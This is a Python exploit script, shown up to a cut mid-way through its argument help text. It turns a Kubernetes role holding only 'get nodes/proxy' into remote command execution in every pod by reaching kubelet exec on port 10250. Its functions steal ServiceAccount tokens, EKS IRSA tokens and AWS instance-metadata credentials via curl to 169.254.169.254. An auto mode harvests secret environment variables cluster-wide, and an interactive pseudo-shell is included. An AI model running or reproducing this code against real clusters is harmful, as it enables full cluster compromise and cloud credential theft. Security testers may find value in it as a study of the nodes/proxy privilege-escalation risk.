#!/usr/bin/env python3
"""
K8s nodes/proxy RCE Exploit — Works on Local K8s, k3s, and AWS EKS
===================================================================

WHAT THIS DOES:
  You have a readonly user/role with ONLY "get nodes/proxy" permission.
  This script gives you FULL RCE into every pod on the cluster.
  Works on ANY Kubernetes distribution: k3s, kubeadm, EKS, GKE, AKS, etc.

TWO-STAGE ATTACK:
  Stage 1: Recon via API server /nodes/<node>/proxy/pods (lists ALL pods)
  Stage 2: Exec via direct kubelet :10250 (WebSocket command execution)

WHY STAGE 2 USES DIRECT KUBELET:
  The API server proxy doesn't properly forward WebSocket query params
  to kubelet. So we:
    1. Use API server proxy for RECON (listing pods — HTTP GET, works fine)
    2. Get the node's internal IP from the API
    3. Connect directly to kubelet:10250 for EXEC (WebSocket, works perfectly)

SUPPORTED ENVIRONMENTS:
  - Local k3s / k3d / minikube / kind / kubeadm clusters
  - AWS EKS (with IRSA + IMDS credential theft)
  - GKE, AKS, or any standard Kubernetes cluster

EKS-SPECIFIC FEATURES (auto-detected):
  - Steals IRSA tokens (AWS IAM role credentials from pods)
  - Steals IMDSv2 tokens via curl to 169.254.169.254
  - Identifies IRSA-annotated pods for AWS privilege escalation
  - Extracts AWS_* environment variables

PREREQUISITES:
  pip3 install -r requirements.txt
  (or run: python3 exploit-eks.py --setup)

INSTALLATION:
  # Linux (Kali / Ubuntu / Debian)
  sudo apt install -y python3 python3-pip curl
  pip3 install websocket-client PyYAML

  # macOS
  brew install python3 curl
  pip3 install websocket-client PyYAML

  # Any platform (from requirements.txt)
  pip3 install -r requirements.txt

USAGE:
  # ── LOCAL K8s / k3s (using kubeconfig) ──
  python3 exploit-eks.py --kubeconfig /path/to/kubeconfig.yaml --node NODE --recon
  python3 exploit-eks.py --kubeconfig /path/to/kubeconfig.yaml --node NODE \\
    -n default -p my-pod -c my-container --command "id"
  python3 exploit-eks.py --kubeconfig /path/to/kubeconfig.yaml --auto

  # ── EKS (using server + token) ──
  python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node NODE --recon
  python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --auto

  # ── Direct kubelet (from inside a pod or same network) ──
  python3 exploit-eks.py --direct https://10.0.1.42:10250 --token $TOKEN \\
    -n default -p my-pod -c my-container --command "id"

  # ── Steal secrets ──
  python3 exploit-eks.py --kubeconfig /path/to/kubeconfig.yaml --node NODE \\
    -n production -p webapp -c webapp --steal-sa
  python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node NODE \\
    -n production -p webapp -c webapp --steal-irsa
  python3 exploit-eks.py --server $EKS_SERVER --token $TOKEN --node NODE \\
    -n kube-system -p aws-node-xxx -c aws-node --steal-imds
"""

import argparse
import json
import shlex
import ssl
import sys
import os
# ─── Dependency Checks ────────────────────────────────────────────────────────

_MISSING_DEPS = []

try:
    import yaml
except ImportError:
    _MISSING_DEPS.append("PyYAML")

try:
    import websocket
except ImportError:
    _MISSING_DEPS.append("websocket-client")


def check_dependencies():
    """Verify all runtime dependencies are available."""
    import shutil
    errors = []

    # Check Python version (need 3.7+ for capture_output)
    if sys.version_info < (3, 7):
        errors.append(f"Python 3.7+ required (found {sys.version})")

    # Check curl
    if not shutil.which("curl"):
        errors.append("curl not found — install with: sudo apt install curl (Linux) or brew install curl (macOS)")

    # Check pip dependencies
    for dep in _MISSING_DEPS:
        errors.append(f"{dep} not installed — pip3 install {dep}")

    if errors:
        print("\033[91m[!] Missing dependencies:\033[0m")
        for e in errors:
            print(f"    \033[93m• {e}\033[0m")
        print(f"\n    Run: \033[96mpip3 install -r requirements.txt\033[0m")
        print(f"    Or:  \033[96mpython3 {sys.argv[0]} --setup\033[0m")
        sys.exit(1)


def print_setup():
    """Print full installation instructions for all platforms."""
    print("""
\033[1m╔══════════════════════════════════════════════════════╗
║  K8s nodes/proxy Exploit — Setup Instructions        ║
╚══════════════════════════════════════════════════════╝\033[0m

\033[1m[1] Linux (Kali / Ubuntu / Debian):\033[0m
    sudo apt update && sudo apt install -y python3 python3-pip curl
    pip3 install websocket-client PyYAML

\033[1m[2] macOS (Homebrew):\033[0m
    brew install python3 curl
    pip3 install websocket-client PyYAML

\033[1m[3] Any platform (from requirements.txt):\033[0m
    pip3 install -r requirements.txt

\033[1m[4] Virtual environment (recommended):\033[0m
    python3 -m venv venv
    source venv/bin/activate        # Linux/macOS
    .\\venv\\Scripts\\activate       # Windows (PowerShell)
    pip install -r requirements.txt

\033[1mDependencies:\033[0m
    \033[96m• websocket-client\033[0m  — WebSocket exec against kubelet
    \033[96m• PyYAML\033[0m            — Kubeconfig file parsing
    \033[96m• curl\033[0m              — HTTP/1.1 requests (system binary)
    \033[96m• Python 3.7+\033[0m      — Runtime

\033[1mSupported Platforms:\033[0m
    \033[92m✓ Linux\033[0m   (Kali, Ubuntu, Debian, Arch, etc.)
    \033[92m✓ macOS\033[0m   (Intel & Apple Silicon — Homebrew)
    \033[92m✓ WSL2\033[0m    (Windows Subsystem for Linux)

\033[1mQuick Test:\033[0m
    python3 exploit-eks.py --kubeconfig ~/.kube/config --node <NODE> --recon
""")
    # Show current status
    import shutil
    print("\033[1mCurrent System Status:\033[0m")
    py_ok = sys.version_info >= (3, 7)
    curl_ok = shutil.which("curl") is not None
    ws_ok = "websocket-client" not in _MISSING_DEPS
    yaml_ok = "PyYAML" not in _MISSING_DEPS
    for name, ok in [(f"Python {sys.version.split()[0]}", py_ok),
                     ("curl", curl_ok),
                     ("websocket-client", ws_ok),
                     ("PyYAML", yaml_ok)]:
        icon = "\033[92m✓\033[0m" if ok else "\033[91m✗\033[0m"
        print(f"    {icon} {name}")
    print()
    sys.exit(0)

# ─── Colors ───────────────────────────────────────────────────────────────────

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"


def banner():
    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════╗
║  K8s nodes/proxy RCE Exploit                         ║
║  "readonly" permission → full cluster compromise     ║
║  Supports: k3s · kubeadm · EKS · GKE · AKS          ║
╚══════════════════════════════════════════════════════╝{RESET}
""")


def parse_kubeconfig(path):
    """
    Extract server URL and bearer token from a kubeconfig file.
    Supports:
      - Static token in user.token
      - Token embedded via user.auth-provider
      - Exec-based token (runs the exec command to get fresh token)
    """
    with open(path) as f:
        kc = yaml.safe_load(f)

    # Find current context
    ctx_name = kc.get("current-context", "")
    ctx = None
    for c in kc.get("contexts", []):
        if c["name"] == ctx_name:
            ctx = c["context"]
            break
    if not ctx:
        ctx = kc["contexts"][0]["context"] if kc.get("contexts") else {}

    cluster_name = ctx.get("cluster", "")
    user_name = ctx.get("user", "")

    # Extract server
    server = None
    for cl in kc.get("clusters", []):
        if cl["name"] == cluster_name:
            server = cl["cluster"].get("server")
            break
    if not server and kc.get("clusters"):
        server = kc["clusters"][0]["cluster"].get("server")

    # Extract token
    token = None
    user_obj = None
    for u in kc.get("users", []):
        if u["name"] == user_name:
            user_obj = u.get("user", {})
            break
    if not user_obj and kc.get("users"):
        user_obj = kc["users"][0].get("user", {})

    if user_obj:
        # Direct token
        token = user_obj.get("token")

        # Exec-based auth (e.g., aws eks get-token)
        if not token and user_obj.get("exec"):
            import subprocess
            exec_cfg = user_obj["exec"]
            cmd = [exec_cfg["command"]] + exec_cfg.get("args", [])
            env = os.environ.copy()
            for ev in exec_cfg.get("env") or []:
                env[ev["name"]] = ev["value"]
            try:
                result = subprocess.run(cmd, capture_output=True, timeout=30, env=env)
                exec_out = json.loads(result.stdout)
                token = exec_out.get("status", {}).get("token")
            except Exception as e:
                print(f"{YELLOW}[!] Exec-based token failed: {e}{RESET}")

        # auth-provider (legacy)
        if not token and user_obj.get("auth-provider"):
            ap = user_obj["auth-provider"].get("config", {})
            token = ap.get("access-token") or ap.get("id-token")

    return server, token


# ─── HTTP / WebSocket Helpers ─────────────────────────────────────────────────

def http_get(url, token, timeout=15):
    """HTTPS GET with bearer token using curl for HTTP/1.1 compatibility."""
    import subprocess as _sp
    result = _sp.run(
        ["curl", "-sk", "--http1.1", "--max-time", str(timeout),
         "-H", f"Authorization: Bearer {token}", url],
        capture_output=True, timeout=timeout + 5,
    )
    if result.returncode != 0:
        raise RuntimeError(f"curl failed ({result.returncode}): {result.stderr.decode()}")
    return result.stdout


def safe_json(data, context="response"):
    """Parse JSON with a helpful error on failure (e.g., 403 HTML)."""
    try:
        return json.loads(data)
    except (json.JSONDecodeError, ValueError):
        snippet = data[:300] if isinstance(data, (str, bytes)) else str(data)[:300]
        if isinstance(snippet, bytes):
            snippet = snippet.decode(errors="replace")
        if "403" in snippet or "Forbidden" in snippet:
            raise RuntimeError(
                f"403 Forbidden — you lack permission for this API call.\n"
                f"  Hint: 'get nodes/proxy' does NOT include 'get nodes' or 'list nodes'.\n"
                f"  Use --direct <kubelet-url> to skip the API server, or ensure your\n"
                f"  role also grants 'get' on 'nodes' (the base resource).\n"
                f"  Response: {snippet}"
            )
        raise RuntimeError(f"Failed to parse {context} as JSON: {snippet}")


def ws_exec(ws_url, token, timeout=15):
    """
    WebSocket exec against kubelet.
    Returns (stdout, stderr, exit_status_dict).
    """
    ws = websocket.create_connection(
        ws_url,
        header=[f"Authorization: Bearer {token}"],
        subprotocols=["v4.channel.k8s.io"],
        sslopt={"cert_reqs": ssl.CERT_NONE},
        timeout=timeout,
    )

    stdout_buf = b""
    stderr_buf = b""
    exit_status = None

    while True:
        try:
            _op, data = ws.recv_data()
            if not data:
                break
            channel = data[0]
            payload = data[1:]
            if channel == 1:
                stdout_buf += payload
            elif channel == 2:
                stderr_buf += payload
            elif channel == 3:
                try:
                    exit_status = json.loads(payload.decode())
                except Exception:
                    exit_status = {"raw": payload.decode(errors="replace")}
                break
        except websocket.WebSocketTimeoutException:
            break
        except Exception:
            break

    ws.close()
    return (
        stdout_buf.decode(errors="replace"),
        stderr_buf.decode(errors="replace"),
        exit_status,
    )


# ─── URL Builders ─────────────────────────────────────────────────────────────

def build_exec_url(kubelet_url, ns, pod, container, cmd_args):
    """Build WebSocket URL for kubelet /exec endpoint."""
    from urllib.parse import quote
    parts = "&".join(f"command={quote(c)}" for c in cmd_args)
    scheme = kubelet_url.replace("https://", "wss://").replace("http://", "ws://")
    path = f"/exec/{ns}/{pod}/{container}"
    return f"{scheme}{path}?{parts}&output=1&error=1&stdout=1&stderr=1"


def build_pods_url_apiserver(server, node):
    """Build URL to list pods via API server proxy."""
    return f"{server}/api/v1/nodes/{node}/proxy/pods"


def build_pods_url_direct(kubelet_url):
    """Build URL to list pods via direct kubelet."""
    return f"{kubelet_url}/pods"


# ─── Preflight Check ──────────────────────────────────────────────────────────

def preflight_check(server, direct, token, node=None):
    """
    Pre-run sanity check: verify the token actually has the permissions needed.
    - API server mode: SelfSubjectAccessReview for 'get nodes/proxy'
    - Direct mode: quick GET /pods to verify kubelet connectivity
    Returns True if all checks pass, False otherwise.
    """
    import subprocess as _sp

    print(f"\n{BOLD}[*] Preflight check...{RESET}")
    ok = True

    def _is_k8s_error(data):
        """Check if parsed JSON is a K8s error status (401/403/etc)."""
        if isinstance(data, dict) and data.get("kind") == "Status":
            code = data.get("code", 0)
            if code >= 400:
                return True, code, data.get("message", "unknown error")
        return False, 0, ""

    if server:
        # Check 1: Can we reach the API server at all? (/api is a public discovery endpoint)
        try:
            raw = http_get(f"{server}/api", token, timeout=10)
            _ = safe_json(raw, "api discovery")
        except Exception as e:
            err_str = str(e)
            # Detect kubelet URL passed as --server (kubelet doesn't have /api)
            is_kubelet = ":10250" in server
            if "404" in err_str or "page not found" in err_str.lower():
                print(f"  {RED}[FAIL] {server} does not look like a K8s API server (got 404 on /api){RESET}")
                if is_kubelet:
                    print(f"  {YELLOW}       This looks like a kubelet URL (port 10250).{RESET}")
                    print(f"  {YELLOW}       Use --direct instead of --server for kubelet connections:{RESET}")
                    print(f"  {CYAN}         --direct {server} --token $TOKEN -n NS -p POD -c CTR --command 'id'{RESET}")
                    print(f"  {CYAN}         --direct {server} --token $TOKEN --recon{RESET}")
                else:
                    print(f"  {YELLOW}       --server should point to the K8s API server (usually port 6443){RESET}")
            else:
                print(f"  {RED}[FAIL] Cannot reach API server: {e}{RESET}")
                if is_kubelet:
                    print(f"  {YELLOW}       Hint: port 10250 is kubelet, not API server. Use --direct instead.{RESET}")
            sys.exit(1)
        print(f"  {GREEN}[OK] API server reachable{RESET}")

        # Check 2: SelfSubjectAccessReview — do we have 'get nodes/proxy'?
        review_body = json.dumps({
            "apiVersion": "authorization.k8s.io/v1",
            "kind": "SelfSubjectAccessReview",
            "spec": {
                "resourceAttributes": {
                    "verb": "get",
                    "resource": "nodes",
                    "subresource": "proxy"
                }
            }
        })
        try:
            result = _sp.run(
                ["curl", "-sk", "--http1.1", "--max-time", "10",
                 "-X", "POST",
                 "-H", f"Authorization: Bearer {token}",
                 "-H", "Content-Type: application/json",
                 "-d", review_body,
                 f"{server}/apis/authorization.k8s.io/v1/selfsubjectaccessreviews"],
                capture_output=True, timeout=15,
            )
            review = safe_json(result.stdout, "access review")
            is_err, code, msg = _is_k8s_error(review)
            if is_err:
                print(f"  {YELLOW}[?] Access review returned error ({code}): {msg}{RESET}")
            else:
                allowed = review.get("status", {}).get("allowed", False)
                if allowed:
                    print(f"  {GREEN}[OK] Token has 'get nodes/proxy' permission{RESET}")
                else:
                    reason = review.get("status", {}).get("reason", "denied by RBAC")
                    print(f"  {RED}[FAIL] Token lacks 'get nodes/proxy': {reason}{RESET}")
                    print(f"  {YELLOW}       This exploit requires a ClusterRole with 'get' on 'nodes/proxy'{RESET}")
                    ok = False
        except Exception as e:
            print(f"  {YELLOW}[?] Could not verify nodes/proxy permission: {e}{RESET}")

        # Check 3 (optional): Can we actually reach pods on this node via proxy?
        if node and ok:
            try:
                raw = http_get(build_pods_url_apiserver(server, node), token, timeout=10)
                pods = safe_json(raw, "proxy pods")
                is_err, code, msg = _is_k8s_error(pods)
                if is_err:
                    print(f"  {RED}[FAIL] nodes/proxy returned HTTP {code} for node '{node}': {msg}{RESET}")
                    ok = False
                else:
                    count = len(pods.get("items", []))
                    if count > 0:
                        print(f"  {GREEN}[OK] nodes/proxy works — found {count} pods on {node}{RESET}")
                    else:
                        print(f"  {YELLOW}[?] nodes/proxy returned 0 pods — node '{node}' may not exist{RESET}")
            except Exception as e:
                err_str = str(e)
                if "403" in err_str or "Forbidden" in err_str:
                    print(f"  {RED}[FAIL] nodes/proxy returned 403 for node '{node}'{RESET}")
                    ok = False
                else:
                    print(f"  {YELLOW}[?] nodes/proxy test failed: {e}{RESET}")

    elif direct:
        # Direct kubelet — test /pods connectivity
        try:
            raw = http_get(build_pods_url_direct(direct), token, timeout=10)
            pods = safe_json(raw, "kubelet pods")
            is_err, code, msg = _is_k8s_error(pods)
            if is_err:
                print(f"  {RED}[FAIL] Kubelet returned HTTP {code}: {msg}{RESET}")
                ok = False
            else:
                count = len(pods.get("items", []))
                print(f"  {GREEN}[OK] Kubelet reachable — {count} pods found{RESET}")
        except Exception as e:
            print(f"  {RED}[FAIL] Cannot reach kubelet: {e}{RESET}")
            ok = False

    if ok:
        print(f"  {GREEN}{BOLD}[✓] All checks passed — exploit ready{RESET}\n")
    else:
        print(f"  {RED}{BOLD}[✗] Preflight failed — fix issues above before continuing{RESET}")
        sys.exit(1)

    return ok


# ─── Core Functions ───────────────────────────────────────────────────────────

def get_nodes(server, token):
    """List all cluster nodes via API server. Requires 'list nodes' permission."""
    data = http_get(f"{server}/api/v1/nodes", token)
    return safe_json(data, "nodes list")


def get_node_ip(server, token, node_name):
    """Get a node's InternalIP from the API server. Requires 'get nodes' permission."""
    data = http_get(f"{server}/api/v1/nodes/{node_name}", token)
    node = safe_json(data, f"node {node_name}")
    for addr in node.get("status", {}).get("addresses", []):
        if addr["type"] == "InternalIP":
            return addr["address"]
    return None


def get_node_ip_from_pods(server, token, node_name):
    """
    Fallback: extract node IP from pod status when 'get nodes' is denied.
    Uses nodes/proxy (which we DO have) to list pods, then reads hostIP.
    """
    try:
        pods_data = list_pods_apiserver(server, token, node_name)
        for pod in pods_data.get("items", []):
            host_ip = pod.get("status", {}).get("hostIP")
            if host_ip:
                return host_ip
    except Exception:
        pass
    return None


def list_pods_apiserver(server, token, node):
    """List all pods on a node via API server proxy."""
    url = build_pods_url_apiserver(server, node)
    data = http_get(url, token)
    return safe_json(data, f"pods on {node}")


def list_pods_direct(kubelet_url, token):
    """List all pods on a node via direct kubelet."""
    url = build_pods_url_direct(kubelet_url)
    data = http_get(url, token)
    return safe_json(data, "direct kubelet pods")


def exec_command(kubelet_url, token, ns, pod, container, command, timeout=15):
    """Execute a command in a pod via kubelet WebSocket."""
    if isinstance(command, str):
        try:
            cmd_args = shlex.split(command)
        except ValueError:
            cmd_args = command.split()
    else:
        cmd_args = list(command)
    url = build_exec_url(kubelet_url, ns, pod, container, cmd_args)
    return ws_exec(url, token, timeout)


# ─── EKS-Specific Functions ──────────────────────────────────────────────────

def steal_irsa_token(kubelet_url, token, ns, pod, container):
    """Steal IRSA (IAM Roles for Service Accounts) JWT token from a pod."""
    # IRSA token is mounted at this path
    token_path = "/var/run/secrets/eks.amazonaws.com/serviceaccount/token"
    stdout, stderr, status = exec_command(
        kubelet_url, token, ns, pod, container, f"cat {token_path}"
    )
    if stdout and stdout.startswith("eyJ"):
        return stdout.strip()
    # Fallback: check AWS_WEB_IDENTITY_TOKEN_FILE env var
    stdout2, _, _ = exec_command(
        kubelet_url, token, ns, pod, container, "env"
    )
    for line in stdout2.splitlines():
        if line.startswith("AWS_WEB_IDENTITY_TOKEN_FILE="):
            path = line.split("=", 1)[1]
            stdout3, _, _ = exec_command(
                kubelet_url, token, ns, pod, container, f"cat {path}"
            )
            if stdout3 and stdout3.startswith("eyJ"):
                return stdout3.strip()
    return None


def steal_imds_creds(kubelet_url, token, ns, pod, container):
    """
    Steal AWS credentials from IMDSv2 via a pod with curl.
    Works if the pod can reach 169.254.169.254 (not blocked by hop limit).
    EKS sets hop-limit=1 for pods by default, but host-network pods bypass this.
    """
    # Step 1: Get IMDSv2 token
    stdout, stderr, _ = exec_command(
        kubelet_url, token, ns, pod, container,
        ["sh", "-c",
         "IMDS_TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' "
         "-H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 2>/dev/null) && "
         "echo \"IMDS_TOKEN=$IMDS_TOKEN\""]
    )
    imds_token = None
    for line in stdout.splitlines():
        if line.startswith("IMDS_TOKEN=") and len(line) > 15:
            imds_token = line.split("=", 1)[1]
            break

    if not imds_token:
        return {"error": "Cannot reach IMDS (hop-limit=1 blocks normal pods, try hostNetwork pod)"}

    # Step 2: Get role name
    stdout2, _, _ = exec_command(
        kubelet_url, token, ns, pod, container,
        ["sh", "-c",
         f"curl -s -H 'X-aws-ec2-metadata-token: {imds_token}' "
         "http://169.254.169.254/latest/meta-data/iam/security-credentials/"]
    )
    role_name = stdout2.strip().split("\n")[0] if stdout2 else ""
    if not role_name:
        return {"error": "No IAM role attached to instance"}

    # Step 3: Get credentials
    stdout3, _, _ = exec_command(
        kubelet_url, token, ns, pod, container,
        ["sh", "-c",
         f"curl -s -H 'X-aws-ec2-metadata-token: {imds_token}' "
         f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"]
    )
    try:
        creds = json.loads(stdout3)
        return {
            "role": role_name,
            "AccessKeyId": creds.get("AccessKeyId"),
            "SecretAccessKey": creds.get("SecretAccessKey"),
            "Token": creds.get("Token", "")[:80] + "...",
        }
    except Exception:
        return {"error": f"Failed to parse creds: {stdout3[:200]}"}


def steal_sa_token(kubelet_url, token, ns, pod, container):
    """Steal the Kubernetes ServiceAccount token from a pod."""
    stdout, _, _ = exec_command(
        kubelet_url, token, ns, pod, container,
        "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
    )
    if stdout and stdout.startswith("eyJ"):
        return stdout.strip()
    return None


def get_aws_env(kubelet_url, token, ns, pod, container):
    """Extract all AWS-related environment variables from a pod."""
    stdout, _, _ = exec_command(kubelet_url, token, ns, pod, container, "env")
    aws_vars = {}
    for line in stdout.splitlines():
        if "=" in line:
            key, val = line.split("=", 1)
            if any(key.startswith(p) for p in ["AWS_", "AMAZON_", "EKS_"]):
                aws_vars[key] = val
    return aws_vars


# ─── Recon ────────────────────────────────────────────────────────────────────

def do_recon(server, token, node):
    """Enumerate all pods on a node via API server proxy."""
    print(f"\n{CYAN}{'='*60}")
    print(f"  RECON: Node {node}")
    print(f"{'='*60}{RESET}\n")

    pods_data = list_pods_apiserver(server, token, node)
    items = pods_data.get("items", [])
    print(f"[+] Found {BOLD}{len(items)}{RESET} pods on node\n")

    targets = {"irsa": [], "privileged": [], "hostnet": [], "secrets_env": [], "all": []}

    for pod in items:
        meta = pod.get("metadata", {})
        spec = pod.get("spec", {})
        ns = meta.get("namespace", "?")
        name = meta.get("name", "?")
        annotations = meta.get("annotations", {})
        containers = spec.get("containers", [])

        # Track ALL containers (not just first) for multi-container pods
        for c in containers:
            targets["all"].append({"ns": ns, "pod": name, "container": c.get("name", "?")})

        # IRSA detection
        c_name = containers[0].get("name", "?") if containers else "?"
        role_arn = annotations.get("eks.amazonaws.com/role-arn", "")
        if role_arn:
            targets["irsa"].append({"ns": ns, "pod": name, "container": c_name, "role": role_arn})

        for c in containers:
            sc = c.get("securityContext", {})
            if sc.get("privileged"):
                targets["privileged"].append({"ns": ns, "pod": name, "container": c.get("name")})

            for e in c.get("env", []):
                en = e.get("name", "")
                if any(s in en.upper() for s in ["SECRET", "PASS", "KEY", "TOKEN", "CRED"]):
                    targets["secrets_env"].append({
                        "ns": ns, "pod": name, "container": c.get("name"), "env": en
                    })

        if spec.get("hostNetwork"):
            targets["hostnet"].append({"ns": ns, "pod": name, "container": c_name})

    # Print
    print(f"{BOLD}--- All Pods ---{RESET}")
    for p in targets["all"]:
        prefix = ""
        if p["ns"] == "kube-system":
            prefix = f"{YELLOW}[system]{RESET} "
        print(f"  {prefix}{p['ns']:25s} {p['pod']:45s} [{p['container']}]")

    if targets["irsa"]:
        print(f"\n{RED}{BOLD}[!!!] IRSA Pods (AWS IAM Roles → can access AWS services):{RESET}")
        for p in targets["irsa"]:
            print(f"  {RED}{p['ns']}/{p['pod']} → {p['role']}{RESET}")

    if targets["privileged"]:
        print(f"\n{RED}{BOLD}[!!!] Privileged Pods (container escape possible):{RESET}")
        for p in targets["privileged"]:
            print(f"  {RED}{p['ns']}/{p['pod']} [{p['container']}]{RESET}")

    if targets["hostnet"]:
        print(f"\n{YELLOW}[!] HostNetwork Pods (can reach IMDS, bypass hop-limit):{RESET}")
        for p in targets["hostnet"]:
            print(f"  {YELLOW}{p['ns']}/{p['pod']}{RESET}")

    if targets["secrets_env"]:
        print(f"\n{YELLOW}[!] Pods With Secret Env Vars:{RESET}")
        for p in targets["secrets_env"]:
            print(f"  {p['ns']}/{p['pod']} [{p['container']}] → {p['env']}")

    return targets


# ─── Auto Mode ────────────────────────────────────────────────────────────────

def do_auto(server, token):
    """Full auto: enumerate all nodes → pods → extract all secrets."""
    print(f"{BOLD}[*] AUTO MODE: Full Cluster Compromise{RESET}\n")

    # 1. Get all nodes — try list nodes, fall back to the --node hint
    nodes = []
    try:
        nodes_data = get_nodes(server, token)
        for n in nodes_data.get("items", []):
            name = n["metadata"]["name"]
            ip = None
            for addr in n.get("status", {}).get("addresses", []):
                if addr["type"] == "InternalIP":
                    ip = addr["address"]
            nodes.append({"name": name, "ip": ip})
    except RuntimeError as e:
        print(f"{YELLOW}[!] Cannot list nodes (likely 403 — 'list nodes' not granted).{RESET}")
        print(f"{YELLOW}    Hint: Use --node + --recon manually, or grant 'list nodes' permission.{RESET}")
        print(f"{YELLOW}    Error: {e}{RESET}")
        return []

    print(f"[+] Found {BOLD}{len(nodes)}{RESET} nodes:")
    for n in nodes:
        print(f"    {n['name']} ({n['ip']})")

    all_findings = []

    for node_info in nodes:
        node = node_info["name"]
        node_ip = node_info["ip"]

        if not node_ip:
            # Fallback: extract IP from pod status via nodes/proxy
            node_ip = get_node_ip_from_pods(server, token, node)
        if not node_ip:
            print(f"\n  {YELLOW}[-] Skipping {node}: cannot determine IP{RESET}")
            continue

        kubelet = f"https://{node_ip}:10250"

        print(f"\n{CYAN}{'─'*60}")
        print(f"  Node: {node} → kubelet: {kubelet}")
        print(f"{'─'*60}{RESET}")

        # Recon via API server
        targets = do_recon(server, token, node)

        # Exec via direct kubelet
        for pod_info in targets["all"]:
            ns, pod, container = pod_info["ns"], pod_info["pod"], pod_info["container"]
            print(f"\n  [>] Exec: {ns}/{pod} [{container}]")

            try:
                stdout, stderr, status = exec_command(
                    kubelet, token, ns, pod, container, "env"
                )
                if stdout:
                    secrets = []
                    for line in stdout.splitlines():
                        upper = line.upper()
                        if any(s in upper for s in [
                            "PASSWORD", "SECRET", "PRIVATE", "AWS_SECRET",
                            "AWS_ACCESS_KEY", "TOKEN=", "CRED", "API_KEY"
                        ]):
                            secrets.append(line)
                    if secrets:
                        print(f"     {RED}[!!!] SECRETS:{RESET}")
                        for s in secrets:
                            print(f"          {RED}{s}{RESET}")
                        all_findings.append({
                            "type": "env_secrets", "node": node, "ns": ns,
                            "pod": pod, "secrets": secrets
                        })
                    else:
                        print(f"     [+] OK ({len(stdout.splitlines())} vars)")
            except Exception as e:
                print(f"     [-] Failed: {e}")

        # Steal SA tokens
        for pod_info in targets["all"]:
            ns, pod, container = pod_info["ns"], pod_info["pod"], pod_info["container"]
            try:
                sa = steal_sa_token(kubelet, token, ns, pod, container)
                if sa:
                    all_findings.append({
                        "type": "sa_token", "node": node, "ns": ns, "pod": pod,
                        "token_preview": sa[:60] + "..."
                    })
                    print(f"  {GREEN}[+] SA token: {ns}/{pod}: {sa[:40]}...{RESET}")
            except Exception:
                pass

        # Steal IRSA tokens
        for pod_info in targets.get("irsa", []):
            ns, pod, container = pod_info["ns"], pod_info["pod"], pod_info["container"]
            try:
                irsa = steal_irsa_token(kubelet, token, ns, pod, container)
                if irsa:
                    all_findings.append({
                        "type": "irsa_token", "node": node, "ns": ns, "pod": pod,
                        "role": pod_info.get("role"), "token_preview": irsa[:60] + "..."
                    })
                    print(f"  {RED}{BOLD}[!!!] IRSA TOKEN: {ns}/{pod} → {pod_info.get('role')}{RESET}")
            except Exception:
                pass

        # Try IMDS on hostNetwork pods
        for pod_info in targets.get("hostnet", []):
            ns, pod, container = pod_info["ns"], pod_info["pod"], pod_info["container"]
            try:
                imds = steal_imds_creds(kubelet, token, ns, pod, container)
                if "AccessKeyId" in imds:
                    all_findings.append({
                        "type": "imds_creds", "node": node, "ns": ns, "pod": pod,
                        "creds": imds
                    })
                    print(f"  {RED}{BOLD}[!!!] IMDS CREDS: {imds['role']} → {imds['AccessKeyId']}{RESET}")
            except Exception:
                pass

    # Summary
    print(f"\n{BOLD}{'='*60}")
    print(f"  ATTACK SUMMARY")
    print(f"{'='*60}{RESET}")
    print(f"  Nodes compromised: {len(nodes)}")
    print(f"  Total findings: {len(all_findings)}")
    for f in all_findings:
        if f["type"] == "env_secrets":
            print(f"  {RED}[SECRET]{RESET} {f['ns']}/{f['pod']}: {len(f['secrets'])} secrets")
        elif f["type"] == "sa_token":
            print(f"  {YELLOW}[SA]{RESET}     {f['ns']}/{f['pod']}: K8s token stolen")
        elif f["type"] == "irsa_token":
            print(f"  {RED}[IRSA]{RESET}   {f['ns']}/{f['pod']} → {f.get('role')}")
        elif f["type"] == "imds_creds":
            print(f"  {RED}[IMDS]{RESET}   {f['ns']}/{f['pod']} → {f['creds'].get('role')}: {f['creds'].get('AccessKeyId')}")

    return all_findings


# ─── Interactive Mode ─────────────────────────────────────────────────────────

def do_interactive(kubelet_url, token, ns, pod, container):
    """Interactive pseudo-shell via repeated exec calls."""
    print(f"\n{GREEN}[*] Pseudo-shell: {ns}/{pod} [{container}]{RESET}")
    print(f"[*] Type commands. 'exit' or Ctrl+C to quit.")
    print(f"[*] Each command is a new exec (no persistent state)\n")

    while True:
        try:
            cmd = input(f"{CYAN}({ns}/{pod}) ${RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exit")
            break
        if not cmd or cmd == "exit":
            break
        try:
            stdout, stderr, _ = exec_command(kubelet_url, token, ns, pod, container, cmd)
            if stdout:
                print(stdout, end="")
            if stderr:
                print(f"{RED}{stderr}{RESET}", end="", file=sys.stderr)
        except Exception as e:
            print(f"{RED}[!] Error: {e}{RESET}")


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="K8s nodes/proxy RCE — readonly to full cluster compromise (local + EKS)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{BOLD}Examples:{RESET}

  # ── LOCAL K8s / k3s (kubeconfig) ──
  %(prog)s --kubeconfig /tmp/readonly-kubeconfig.yaml --node mynode --recon
  %(prog)s --kubeconfig /tmp/readonly-kubeconfig.yaml --auto
  %(prog)s --kubeconfig /tmp/readonly-kubeconfig.yaml --node mynode \\
    -n default -p my-pod -c my-container --command "id"

  # ── EKS (server + token) ──
  %(prog)s --server $EKS_SERVER --token $TOKEN --node NODE --recon
  %(prog)s --server $EKS_SERVER --token $TOKEN --auto

  # ── Direct kubelet ──
  %(prog)s --direct https://10.0.1.42:10250 --token $TOKEN \\
    -n default -p my-pod -c my-container --command "id"

  # ── Steal secrets ──
  %(prog)s --kubeconfig /tmp/kc.yaml --node mynode \\
    -n production -p webapp -c webapp --steal-sa
  %(prog)s --server $EKS_SERVER --token $TOKEN --node NODE \\
    -n production -p webapp -c webapp --steal-irsa
  %(prog)s --server $EKS_SERVER --token $TOKEN --node NODE \\
